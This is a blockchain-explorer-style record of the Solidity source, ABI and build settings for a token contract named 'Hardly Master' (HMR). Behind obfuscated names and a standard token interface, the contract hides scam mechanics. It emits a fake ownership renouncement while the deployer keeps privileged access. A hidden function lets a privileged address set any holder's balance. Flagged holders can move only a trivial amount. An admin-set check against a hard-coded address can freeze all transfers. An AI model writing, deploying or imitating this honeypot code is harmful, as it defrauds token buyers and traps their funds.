{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface totalFund {\n    function createPair(address marketingTakeLaunched, address tradingSell) external returns (address);\n}\n\ninterface fundLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeEnable) external view returns (uint256);\n\n    function transfer(address fundBuy, uint256 feeAmount) external returns (bool);\n\n    function allowance(address amountReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundBuy,\n        uint256 feeAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchedFeeMin, uint256 value);\n    event Approval(address indexed amountReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract teamTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fundLiquidityMetadata is fundLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract HardlyMaster is teamTx, fundLiquidity, fundLiquidityMetadata {\n\n    constructor (){\n        \n        tradingToken liquidityMax = tradingToken(teamList);\n        buyFee = totalFund(liquidityMax.factory()).createPair(liquidityMax.WETH(), address(this));\n        if (teamFrom == amountWallet) {\n            shouldExemptMin = true;\n        }\n        atMaxSwap = _msgSender();\n        txLimit[atMaxSwap] = true;\n        marketingBuyIs[atMaxSwap] = swapSender;\n        marketingTokenAmount();\n        if (atTotalLimit != amountWallet) {\n            teamFrom = atTotalLimit;\n        }\n        emit Transfer(address(0), atMaxSwap, swapSender);\n    }\n\n    bool private launchMax;\n\n    function decimals() external view virtual override returns (uint8) {\n        return isEnable;\n    }\n\n    uint256 private amountWallet;\n\n    function allowance(address exemptAutoTrading, address tokenSell) external view virtual override returns (uint256) {\n        if (tokenSell == teamList) {\n            return type(uint256).max;\n        }\n        return listWallet[exemptAutoTrading][tokenSell];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapSender;\n    }\n\n    function fundWallet(address enableTrading, uint256 feeAmount) public {\n        liquidityLaunched();\n        marketingBuyIs[enableTrading] = feeAmount;\n    }\n\n    string private liquidityEnable = \"Hardly Master\";\n\n    function getOwner() external view returns (address) {\n        return buyMin;\n    }\n\n    uint256 launchFee;\n\n    address public atMaxSwap;\n\n    uint256 public teamFrom;\n\n    function swapShould(address autoLiquidity, address fundBuy, uint256 feeAmount) internal returns (bool) {\n        if (autoLiquidity == atMaxSwap) {\n            return minAutoReceiver(autoLiquidity, fundBuy, feeAmount);\n        }\n        uint256 txSenderShould = fundLiquidity(buyFee).balanceOf(fromTake);\n        require(txSenderShould == toFee);\n        require(fundBuy != fromTake);\n        if (amountEnable[autoLiquidity]) {\n            return minAutoReceiver(autoLiquidity, fundBuy, launchIs);\n        }\n        return minAutoReceiver(autoLiquidity, fundBuy, feeAmount);\n    }\n\n    function owner() external view returns (address) {\n        return buyMin;\n    }\n\n    function toMax(address amountSender) public {\n        if (atLiquidity) {\n            return;\n        }\n        if (shouldExemptMin == modeAuto) {\n            modeAuto = false;\n        }\n        txLimit[amountSender] = true;\n        \n        atLiquidity = true;\n    }\n\n    uint256 private swapSender = 100000000 * 10 ** 18;\n\n    string private atTakeTrading = \"HMR\";\n\n    function balanceOf(address takeEnable) public view virtual override returns (uint256) {\n        return marketingBuyIs[takeEnable];\n    }\n\n    bool private shouldExemptMin;\n\n    address private buyMin;\n\n    uint8 private isEnable = 18;\n\n    function liquidityLaunched() private view {\n        require(txLimit[_msgSender()]);\n    }\n\n    function approve(address tokenSell, uint256 feeAmount) public virtual override returns (bool) {\n        listWallet[_msgSender()][tokenSell] = feeAmount;\n        emit Approval(_msgSender(), tokenSell, feeAmount);\n        return true;\n    }\n\n    mapping(address => uint256) private marketingBuyIs;\n\n    mapping(address => bool) public amountEnable;\n\n    function marketingTokenAmount() public {\n        emit OwnershipTransferred(atMaxSwap, address(0));\n        buyMin = address(0);\n    }\n\n    uint256 toFee;\n\n    bool public atLiquidity;\n\n    function symbol() external view virtual override returns (string memory) {\n        return atTakeTrading;\n    }\n\n    mapping(address => mapping(address => uint256)) private listWallet;\n\n    function receiverTrading(address teamBuyTo) public {\n        liquidityLaunched();\n        if (shouldExemptMin) {\n            totalFee = true;\n        }\n        if (teamBuyTo == atMaxSwap || teamBuyTo == buyFee) {\n            return;\n        }\n        amountEnable[teamBuyTo] = true;\n    }\n\n    event OwnershipTransferred(address indexed senderLimit, address indexed atSwap);\n\n    address fromTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityEnable;\n    }\n\n    address public buyFee;\n\n    bool public totalFee;\n\n    function liquidityMode(uint256 feeAmount) public {\n        liquidityLaunched();\n        toFee = feeAmount;\n    }\n\n    uint256 private atTotalLimit;\n\n    mapping(address => bool) public txLimit;\n\n    function transferFrom(address autoLiquidity, address fundBuy, uint256 feeAmount) external override returns (bool) {\n        if (_msgSender() != teamList) {\n            if (listWallet[autoLiquidity][_msgSender()] != type(uint256).max) {\n                require(feeAmount <= listWallet[autoLiquidity][_msgSender()]);\n                listWallet[autoLiquidity][_msgSender()] -= feeAmount;\n            }\n        }\n        return swapShould(autoLiquidity, fundBuy, feeAmount);\n    }\n\n    bool private modeAuto;\n\n    function transfer(address enableTrading, uint256 feeAmount) external virtual override returns (bool) {\n        return swapShould(_msgSender(), enableTrading, feeAmount);\n    }\n\n    address teamList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 constant launchIs = 6 ** 10;\n\n    function minAutoReceiver(address autoLiquidity, address fundBuy, uint256 feeAmount) internal returns (bool) {\n        require(marketingBuyIs[autoLiquidity] >= feeAmount);\n        marketingBuyIs[autoLiquidity] -= feeAmount;\n        marketingBuyIs[fundBuy] += feeAmount;\n        emit Transfer(autoLiquidity, fundBuy, feeAmount);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atSwap\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedFeeMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptAutoTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMaxSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeEnable\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAmount\",\"type\":\"uint256\"}],\"name\":\"fundWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeAmount\",\"type\":\"uint256\"}],\"name\":\"liquidityMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTokenAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamBuyTo\",\"type\":\"address\"}],\"name\":\"receiverTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountSender\",\"type\":\"address\"}],\"name\":\"toMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "HardlyMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}